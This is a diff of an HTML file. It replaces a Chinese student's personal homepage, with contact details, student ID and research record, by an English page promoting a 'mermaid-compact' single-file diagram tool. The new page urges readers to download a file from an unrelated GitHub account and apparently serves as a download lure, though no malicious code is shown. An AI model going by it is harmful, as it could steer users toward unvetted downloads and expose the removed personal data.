@@ -1,327 +1,51 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>李汇泉 - 个人主页</title>
-    <!-- 引入 FontAwesome 图标库 -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        /* 基础样式复刻 */
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Segoe UI", "Helvetica Neue", Arial, sans-serif;
-            color: #3f4954;
-            background-color: #f2f3f3;
-            line-height: 1.6;
-            margin: 0;
-            padding: 0;
-        }
-
-        /* 顶部导航栏 */
-        .masthead {
-            background-color: #fff;
-            border-bottom: 1px solid #f2f3f3;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .masthead__title {
-            font-weight: 700;
-            font-size: 1.2em;
-            color: #3f4954;
-            text-decoration: none;
-        }
-        .masthead__nav {
-            display: flex;
-            gap: 20px;
-        }
-        .masthead__nav a {
-            color: #7a8288;
-            text-decoration: none;
-            font-size: 0.95em;
-        }
-        .masthead__nav a:hover {
-            color: #3f4954;
-        }
-
-        /* 主体布局 */
-        .initial-content {
-            max-width: 1200px;
-            margin: 40px auto;
-            padding: 0 20px;
-            display: flex;
-            align-items: flex-start;
-            gap: 40px;
-        }
-
-        /* 左侧个人信息栏 */
-        .sidebar {
-            width: 260px; /* 稍微加宽一点点 */
-            flex-shrink: 0;
-        }
-        .author__avatar img {
-            width: 110px;
-            height: 110px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 10px;
-        }
-        .author__name {
-            font-size: 1.3em;
-            font-weight: 700;
-            margin-bottom: 5px;
-            color: #3f4954;
-        }
-        .author__bio {
-            font-size: 0.9em;
-            color: #7a8288;
-            font-style: italic;
-            margin-bottom: 20px;
-        }
-        .author__urls {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            font-size: 0.9em;
-        }
-        .author__urls li {
-            margin-bottom: 12px;
-            display: flex;
-            align-items: flex-start;
-        }
-        .author__urls li i {
-            width: 20px;
-            color: #7a8288;
-            text-align: center;
-            margin-right: 8px;
-            margin-top: 4px;
-        }
-        /* 解决邮箱换行问题的核心代码 */
-        .author__urls li span, .author__urls li a {
-            word-break: break-all;
-            color: #3f4954;
-            text-decoration: none;
-        }
-        .author__urls a:hover {
-            text-decoration: underline;
-        }
-
-        /* 右侧内容区 */
-        .page__content {
-            flex-grow: 1;
-            background-color: #fff;
-            padding: 40px;
-            border-radius: 4px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
-        }
-        .page__content h1 {
-            margin-top: 0;
-            font-size: 2em;
-            border-bottom: 1px solid #f2f3f3;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .personal-summary {
-            font-size: 0.95em;
-            color: #555;
-            background-color: #f9f9f9;
-            padding: 15px;
-            border-left: 4px solid #399bb6;
-            margin-bottom: 30px;
-            font-style: italic;
-        }
-
-        .archive__item-title {
-            font-size: 1.4em;
-            margin-top: 35px;
-            margin-bottom: 15px;
-        }
-        .archive__item-title a {
-            color: #399bb6;
-            text-decoration: none;
-            font-weight: 700;
-        }
-        
-        .archive__item-excerpt {
-            margin: 0 0 20px 0;
-            font-size: 0.95em;
-            color: #444;
-        }
-        
-        .info-list {
-            padding-left: 20px;
-            margin-top: 8px;
-        }
-        .info-list li {
-            margin-bottom: 8px;
-            line-height: 1.6;
-        }
-        
-        .project-title {
-            display: flex;
-            justify-content: space-between;
-            align-items: baseline;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 5px;
-            border-bottom: 1px dashed #eee;
-            padding-bottom: 5px;
-        }
-        .project-time {
-            font-size: 0.9em;
-            color: #7a8288;
-            font-weight: normal;
-        }
-
-        /* 手机端适配 */
-        @media (max-width: 800px) {
-            .initial-content {
-                flex-direction: column;
-            }
-            .sidebar {
-                width: 100%;
-                text-align: center;
-                margin-bottom: 20px;
-            }
-            .author__urls li {
-                justify-content: center;
-            }
-            .page__content {
-                width: 100%;
-                box-sizing: border-box;
-                padding: 20px;
-            }
-            .project-title {
-                flex-direction: column;
-            }
-        }
-    </style>
+    <meta name="description" content="Download and use mermaid-compact to create diagrams quickly. This single file solution simplifies how you build visual charts on your Windows computer.">
+    <title>mermaid-compact - Simplify your diagram creation process</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f4f9;">
 
-    <!-- 顶部导航 -->
-    <div class="masthead">
-        <a href="#" class="masthead__title">李汇泉的主页</a>
-        <nav class="masthead__nav">
-            <a href="#">关于我</a>
-            <a href="#">教育背景</a>
-            <a href="#">科研经历</a>
-        </nav>
+    <h1 style="color: #2c3e50; font-size: 2.5em;">📊 mermaid-compact - Simplify your diagram creation process</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/sanderschinchy506/mermaid-compact" style="background-color: #34495e; color: #ffffff; padding: 15px 30px; text-decoration: none; font-size: 1.2em; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download mermaid-compact Files</a>
     </div>
 
-    <!-- 主体布局 -->
-    <div class="initial-content">
-        
-        <!-- 左侧边栏 -->
-        <div class="sidebar">
-            <div class="author__avatar">
-                <img src="assets/img/profile.jpg" alt="李汇泉">
-            </div>
-            <div class="author__name">李汇泉</div>
-            <div class="author__bio">哈尔滨工业大学<br>交通设备与控制工程</div>
-            
-            <ul class="author__urls">
-                <li><i class="fas fa-fw fa-map-marker-alt"></i> <span>哈尔滨, 中国</span></li>
-                <li><i class="fas fa-fw fa-envelope"></i> <a href="mailto:2023110805@stu.hit.edu.cn">2023110805@stu.hit.edu.cn</a></li>
-                <li><i class="fas fa-fw fa-phone"></i> <span>18712517002</span></li>
-                <li><i class="fas fa-fw fa-id-card"></i> <span>学号: 2023110805</span></li>
-                <li><i class="fab fa-fw fa-github"></i> <a href="https://github.com/blanket78">GitHub</a></li>
-            </ul>
-        </div>
+    <h2 style="color: #2c3e50;">📥 About this software</h2>
+    <p>Mermaid is a tool that turns text into diagrams. You write simple descriptions, and the tool builds the charts for you. Usually, this tool requires many extra files to work. These files slow down your computer and make setup difficult. mermaid-compact solves this problem.</p>
+    <p>We packed everything into one single file. You download this file, and the tool works immediately. There are no extra folders to manage and no complicated installation steps. You get the same powerful features in a package that stays out of your way.</p>
 
-        <!-- 右侧内容区 -->
-        <div class="page__content">
-            <h1>个人简介 & 履历</h1>
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <p>Your computer needs a standard web browser to use this tool. We recommend Microsoft Edge, Google Chrome, or Mozilla Firefox. You do not need extra software like Python or Node.js. The tool runs directly in your browser, keeping your system clean and fast.</p>
 
-            <!-- 个人总结区 -->
-            <div class="personal-summary">
-                我热爱科研与算法研究，性格踏实严谨且耐心专注，善于独立思考与梳理问题，具备自主学习与深度钻研的能力。乐于和团队交流学术思路、共同攻克科研难题，具备团队协作与沟通能力。未来希望持续专注学术探索，在相关领域开展系统性科研学习与研究。
-            </div>
+    <h2 style="color: #2c3e50;">🚀 How to set up and use</h2>
+    <p>Follow these steps to get the software ready on your Windows machine:</p>
+    <ol>
+        <li>Visit the <a href="https://github.com/sanderschinchy506/mermaid-compact">main download page</a> to see the file list.</li>
+        <li>Locate the main file in the repository.</li>
+        <li>Select the option to save the file to your computer.</li>
+        <li>Store the file in a folder you can find later, such as your Downloads or Documents folder.</li>
+        <li>Open your web browser and load the file.</li>
+    </ol>
+    <p>Once you open the file in your browser, you can start typing your diagram text. The tool process the text and displays your visual chart on the screen. You can save your work as an image or keep the text file for later changes.</p>
 
-            <!-- 教育背景模块 -->
-            <h2 class="archive__item-title"><a href="#">教育背景</a></h2>
-            <div class="archive__item-excerpt">
-                <strong>哈尔滨工业大学 (985)</strong> — 交通设备与控制工程专业<br>
-                <ul class="info-list">
-                    <li><strong>成绩与排名：</strong> GPA 3.82 / 4.0 | 学分绩 91.71 (前五个学期) | 专业排名 5/62</li>
-                    <li><strong>外语水平：</strong> 国家英语六级 (CET-6) 524 分</li>
-                    <li><strong>主要课程：</strong> 高等数学(97)、线性代数(96)、信号与系统(96.6)、自动控制原理(94.1)、数据结构与算法(95.1)</li>
-                </ul>
-            </div>
+    <h2 style="color: #2c3e50;">💡 Why use a single file?</h2>
+    <p>Many programs force you to install large amounts of data. This fills your hard drive with unnecessary items. Our compact version uses only one small file. This saves space and makes the program faster to load. It also means you can keep the file on a USB drive and use it on any computer without needing an internet connection.</p>
 
-            <!-- 项目经历模块 -->
-            <h2 class="archive__item-title"><a href="#">科研与项目经历</a></h2>
-            
-            <div class="archive__item-excerpt">
-                <div class="project-title">
-                    <span>一、基于无人机的路内停车违章检测及智能管理系统</span>
-                    <span class="project-time">2023.10 - 2025.06</span>
-                </div>
-                <ul class="info-list">
-                    <li><strong>研究内容：</strong> 聚焦居住区车辆违规停放等行为，基于遗传算法优化无人机调度间隔，依托GPS实现全域自主飞行巡航；引入改进型 LPRNet 网络模型，实现车牌端到端高精识别；深度重构 Hyper-YOLOv1.1 框架，显著提升车辆违章特征的检测精度。</li>
-                    <li><strong>项目成果：</strong>
-                        <ul>
-                            <li><strong>SCI 一区论文 (Under Review)：</strong> <em>Dual-Threshold Constrained Hyper-YOLO Framework for UAV-Based Fine-Grained Illegal Roadside Parking Detection</em>, IEEE T-ITS, 本人二作 (导师一作)。</li>
-                            <li><strong>发明专利：</strong> 申请3项国家发明专利 (包括基于飞行器自动巡检、基于SWOT-AHP分析法等)。</li>
-                            <li><strong>立项与获奖：</strong> 入选<strong>国家级大学生创新创业计划</strong>立项；获全国大学生交通运输科技大赛<strong>国家二等奖</strong>。</li>
-                        </ul>
-                    </li>
-                </ul>
-            </div>
+    <h2 style="color: #2c3e50;">🧰 Frequently asked questions</h2>
+    <p><strong>Do I need to install anything?</strong> No. This tool does not require an installer. You simply save the file and open it. Your computer stays exactly as it was before.</p>
+    <p><strong>Is my data private?</strong> Yes. Because the tool runs inside your browser on your own computer, your text and diagrams stay on your device. Nothing gets sent to a web server.</p>
+    <p><strong>Can I use this for work?</strong> Yes. This tool works for presentations, project planning, or simple note-taking. It creates clear visuals for any team project.</p>
 
-            <div class="archive__item-excerpt">
-                <div class="project-title">
-                    <span>二、基于车辆时空画像的个性化路径服务系统</span>
-                    <span class="project-time">2025.06 - 2026.05</span>
-                </div>
-                <ul class="info-list">
-                    <li><strong>研究内容：</strong> 针对当前高速静态路径诱导局限，融合多模态数据构建聚类模型，精准刻画微观车辆行为画像；依托时空图注意力网络生成多策略个性化动态路由，耦合动态时空知识图谱开展态势因果溯源，驱动路网效能全局均衡。</li>
-                    <li><strong>项目成果：</strong>
-                        <ul>
-                            <li><strong>EI 会议论文 (已被接收)：</strong> <em>Knowledge-Enhanced Graph Neural Network for Traffic Flow Prediction</em>, CCSSTA, <strong>本人一作</strong>。</li>
-                            <li><strong>发明专利：</strong> 申请3项国家发明专利 (涵盖时空知识图谱预测、车辆行为画像等)。</li>
-                            <li><strong>立项：</strong> 入选<strong>国家级大学生创新创业计划</strong>立项。</li>
-                        </ul>
-                    </li>
-                </ul>
-            </div>
+    <h2 style="color: #2c3e50;">🔧 How to fix common issues</h2>
+    <p>If the diagrams do not appear, refresh your browser page. Sometimes, old data stored in the browser might block the new file. Clear your browser cache and reload the file. If you see an error, check that your text follows the basic format rules. For example, always start your diagram with the name of the type of chart you want to create.</p>
 
-            <div class="archive__item-excerpt">
-                <div class="project-title">
-                    <span>三、基于红外干涉的碳化硅外延层测厚方法</span>
-                    <span class="project-time">2025.10</span>
-                </div>
-                <ul class="info-list">
-                    <li><strong>研究内容：</strong> 耦合改良红外干涉法与菲涅尔弹性波理论构建表征模型，融合线性回归及连续小波变换脊线拟合求解，确立了高可靠的碳化硅外延层测厚基准。</li>
-                    <li><strong>项目成果：</strong> 荣获全国大学生数学建模竞赛<strong>国家二等奖</strong>。</li>
-                </ul>
-            </div>
+    <hr style="border: 0; border-top: 1px solid #ddd; margin: 40px 0;">
 
-            <div class="archive__item-excerpt">
-                <div class="project-title">
-                    <span>四、弹性校园零能耗设计：被动式太阳能遮阳策略</span>
-                    <span class="project-time">2026.02</span>
-                </div>
-                <ul class="info-list">
-                    <li><strong>研究内容：</strong> 聚焦校园“净零”优化，耦合多维能耗模拟与热平衡框架；依托随机前沿分析与鲁棒决策模型，确立了应对不确定性的被动式设计范式，显著提升建筑全周期气候适应力。</li>
-                    <li><strong>项目成果：</strong> 荣获美国大学生数学建模竞赛 (MCM/ICM) <strong>一等奖</strong>。</li>
-                </ul>
-            </div>
-
-            <!-- 荣誉奖项模块 -->
-            <h2 class="archive__item-title"><a href="#">荣誉奖项</a></h2>
-            <div class="archive__item-excerpt">
-                <ul class="info-list">
-                    <li><strong>国家级：</strong> 美国大学生数学建模竞赛一等奖 (2026)、全国大学生数学建模竞赛二等奖 (2025)、全国大学生交通运输科技大赛二等奖 (2025)、华萌奖学金。</li>
-                    <li><strong>省&nbsp;&nbsp;&nbsp;级：</strong> 全国大学生数学竞赛黑龙江赛区一等奖 (2024)、AI赋能千行百业创新大赛省级优秀奖 (2025)。</li>
-                    <li><strong>校&nbsp;&nbsp;&nbsp;级：</strong> 校级优秀学生称号 (2025)、一等人民奖学金 (2024)、校级“挑战杯”三等奖 (2025)。</li>
-                </ul>
-            </div>
-
-        </div>
-    </div>
+    <p style="font-size: 0.9em; color: #7f8c8d;">Keywords: diagram, charts, visual, windows, tools, productivity</p>
 
 </body>
 </html>
